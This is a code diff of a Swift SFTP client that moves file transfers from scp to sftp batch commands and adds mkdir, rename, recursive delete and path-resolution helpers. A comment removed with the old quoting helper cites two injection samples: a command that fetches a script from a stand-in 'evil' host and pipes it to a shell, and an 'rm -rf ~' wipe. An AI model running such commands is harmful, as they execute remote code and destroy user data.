@@ -29,45 +29,112 @@ enum SFTPClient {
         let size: Int64
     }
 
+    /// Build the `cd` line for a remote path — or none at all.
+    ///
+    /// SFTP has no shell, so `~` is NOT expanded: `cd "~"` fails outright with
+    /// "No such file or directory", which silently produced an empty listing for
+    /// the default connection (whose path is `~`). An sftp session already
+    /// starts in the user's home directory, so:
+    ///   - home (`~`, `~/`, `.`, empty) → no `cd` at all
+    ///   - `~/sub`                      → `cd "sub"` (relative to the home start)
+    ///   - anything else                → `cd "<path>"` as given
+    private static func cdLine(for path: String) -> String {
+        let p = path.trimmingCharacters(in: .whitespaces)
+        if p.isEmpty || p == "~" || p == "~/" || p == "." { return "" }
+        if p.hasPrefix("~/") { return "cd \(escape(String(p.dropFirst(2))))\n" }
+        return "cd \(escape(p))\n"
+    }
+
     /// List entries at `path` on the given connection. Uses `sftp -b -` and
     /// parses the `ls -l`-style output.
     static func list(_ conn: Connection, path: String) -> [Entry] {
-        var batch = ""
-        batch += "cd \(escape(path.isEmpty ? "." : path))\n"
-        batch += "ls -la\n"
-        batch += "bye\n"
+        let batch = cdLine(for: path) + "ls -la\nbye\n"
         let raw = run(conn, stdin: batch) ?? ""
         return parseLs(raw)
     }
 
-    /// Download a single file to a local destination. Uses `scp`.
+    /// Download a single file to a local destination.
+    ///
+    /// Transfers go through the same `sftp -b -` channel as listing, NOT `scp`.
+    /// OpenSSH 9.0+ makes `scp` speak the SFTP protocol, where the remote path
+    /// is no longer expanded by a remote shell — so the single-quoting we used
+    /// to apply for injection safety became *literal characters in the
+    /// filename* and every transfer failed with "No such file or directory".
+    ///
+    /// sftp's own command parser understands the double-quoted form, and no
+    /// shell is involved anywhere in this path, so quoting here is both correct
+    /// and injection-proof by construction. Do not reintroduce shell quoting.
     @discardableResult
     static func download(_ conn: Connection, remotePath: String, to local: URL) -> Bool {
-        let target = "\(conn.sshTarget):\(remoteQuote(remotePath))"
-        let p = Process()
-        p.launchPath = "/usr/bin/scp"
-        var args = ["-q", "-o", "BatchMode=yes", "-o", "ConnectTimeout=7"]
-        if conn.port != 22 { args.append(contentsOf: ["-P", "\(conn.port)"]) }
-        args.append(contentsOf: [target, local.path])
-        p.arguments = args
-        do { try p.run() } catch { return false }
-        p.waitUntilExit()
-        return p.terminationStatus == 0
+        let batch = "get \(escape(remotePath)) \(escape(local.path))\nbye\n"
+        guard let result = runDetailed(conn, stdin: batch), result.status == 0 else { return false }
+        return FileManager.default.fileExists(atPath: local.path)
     }
 
-    /// Upload a local file to a remote path.
+    /// Upload a local file to a remote path. See `download` for why this uses
+    /// the sftp channel rather than `scp`.
     @discardableResult
     static func upload(_ conn: Connection, local: URL, to remotePath: String) -> Bool {
-        let target = "\(conn.sshTarget):\(remoteQuote(remotePath))"
-        let p = Process()
-        p.launchPath = "/usr/bin/scp"
-        var args = ["-q", "-o", "BatchMode=yes", "-o", "ConnectTimeout=7"]
-        if conn.port != 22 { args.append(contentsOf: ["-P", "\(conn.port)"]) }
-        args.append(contentsOf: [local.path, target])
-        p.arguments = args
-        do { try p.run() } catch { return false }
-        p.waitUntilExit()
-        return p.terminationStatus == 0
+        let batch = "put \(escape(local.path)) \(escape(remotePath))\nbye\n"
+        guard let result = runDetailed(conn, stdin: batch) else { return false }
+        return result.status == 0
+    }
+
+    // MARK: - Mutating operations
+    //
+    // All of these go through the sftp batch channel, so the remote path is a
+    // protocol field rather than shell text — no injection surface.
+
+    /// Create a remote directory.
+    @discardableResult
+    static func makeDirectory(_ conn: Connection, path: String) -> Bool {
+        runOK(conn, "mkdir \(escape(path))")
+    }
+
+    /// Rename (or move) a remote entry.
+    @discardableResult
+    static func rename(_ conn: Connection, from: String, to: String) -> Bool {
+        runOK(conn, "rename \(escape(from)) \(escape(to))")
+    }
+
+    /// Delete a remote file.
+    @discardableResult
+    static func removeFile(_ conn: Connection, path: String) -> Bool {
+        runOK(conn, "rm \(escape(path))")
+    }
+
+    /// Delete a remote directory and its contents. sftp's `rmdir` only removes
+    /// EMPTY directories, so walk depth-first. A failed listing yields no
+    /// children, in which case the final `rmdir` fails on a non-empty directory
+    /// rather than silently reporting success.
+    @discardableResult
+    static func removeDirectory(_ conn: Connection, path: String) -> Bool {
+        for entry in list(conn, path: path) {
+            let child = (path as NSString).appendingPathComponent(entry.name)
+            let ok = entry.isDirectory ? removeDirectory(conn, path: child)
+                                       : removeFile(conn, path: child)
+            if !ok { return false }
+        }
+        return runOK(conn, "rmdir \(escape(path))")
+    }
+
+    /// Delete a remote entry. NOTE: this is permanent — servers have no Trash.
+    @discardableResult
+    static func remove(_ conn: Connection, path: String, isDirectory: Bool) -> Bool {
+        isDirectory ? removeDirectory(conn, path: path) : removeFile(conn, path: path)
+    }
+
+    /// True when `path` already exists remotely (used to pick a free name).
+    static func exists(_ conn: Connection, path: String) -> Bool {
+        let parent = (path as NSString).deletingLastPathComponent
+        let name = (path as NSString).lastPathComponent
+        return list(conn, path: parent.isEmpty ? "/" : parent).contains { $0.name == name }
+    }
+
+    /// Run a single sftp command, reporting whether it succeeded.
+    private static func runOK(_ conn: Connection, _ command: String) -> Bool {
+        guard let result = runDetailed(conn, stdin: command + "\nbye\n") else { return false }
+        return result.status == 0
     }
 
     /// Quickly verify we can connect using existing creds. Returns nil on
@@ -78,20 +145,42 @@ enum SFTPClient {
         return nil
     }
 
+    /// Resolve a (possibly `~`, empty, or relative) path to an absolute remote
+    /// path, so every `sftp://` URL we build is canonical and navigation
+    /// (append/deleteLastPathComponent) stays consistent. Returns nil if the
+    /// connection fails.
+    static func realpath(_ conn: Connection, path: String) -> String? {
+        let batch = cdLine(for: path) + "pwd\nbye\n"
+        guard let raw = run(conn, stdin: batch) else { return nil }
+        // `sftp` prints: "Remote working directory: /home/user"
+        for line in raw.split(separator: "\n") {
+            if let r = line.range(of: "Remote working directory: ") {
+                return String(line[r.upperBound...]).trimmingCharacters(in: .whitespaces)
+            }
+        }
+        return nil
+    }
+
     // MARK: - Internals
 
     private static func escape(_ s: String) -> String {
         "\"" + s.replacingOccurrences(of: "\"", with: "\\\"") + "\""
     }
 
-    /// Single-quote a path for the remote shell that `scp` runs the source/target
-    /// through — so a filename from a hostile server's `ls` listing can't inject
-    /// remote commands (e.g. `$(curl evil|sh)` or `;rm -rf ~`).
-    private static func remoteQuote(_ s: String) -> String {
-        "'" + s.replacingOccurrences(of: "'", with: "'\\''") + "'"
-    }
+    // NOTE: a `remoteQuote` helper used to single-quote paths for the remote
+    // shell that legacy `scp` ran them through. Every transfer now goes over the
+    // SFTP protocol, which has no remote shell — that quoting broke all
+    // transfers and has been removed deliberately. Don't add it back.
 
     private static func run(_ conn: Connection, stdin: String) -> String? {
+        runDetailed(conn, stdin: stdin)?.out
+    }
+
+    /// Run an sftp batch and return its stdout plus the exit status. `sftp -b`
+    /// exits non-zero when any command in the batch fails, which is how the
+    /// transfer helpers detect failure (stderr is discarded to avoid a
+    /// full-pipe deadlock).
+    private static func runDetailed(_ conn: Connection, stdin: String) -> (out: String, status: Int32)? {
         let p = Process()
         p.launchPath = "/usr/bin/sftp"
         var args = ["-b", "-", "-o", "BatchMode=yes", "-o", "ConnectTimeout=7"]
@@ -110,7 +199,7 @@ enum SFTPClient {
         try? inPipe.fileHandleForWriting.close()
         let data = outPipe.fileHandleForReading.readDataToEndOfFile()
         p.waitUntilExit()
-        return String(data: data, encoding: .utf8)
+        return (String(data: data, encoding: .utf8) ?? "", p.terminationStatus)
     }
 
     private static func parseLs(_ raw: String) -> [Entry] {
@@ -140,6 +229,9 @@ enum SFTPClient {
 
     /// Test hook — exercises the `ls -la` parser without a live connection.
     static func testParseLs(_ raw: String) -> [Entry] { parseLs(raw) }
+
+    /// Test hook — exercises remote-path → `cd` line translation.
+    static func testCdLine(_ path: String) -> String { cdLine(for: path) }
 }
 
 /// Persistent store of saved SFTP connections, surfaced in the sidebar.
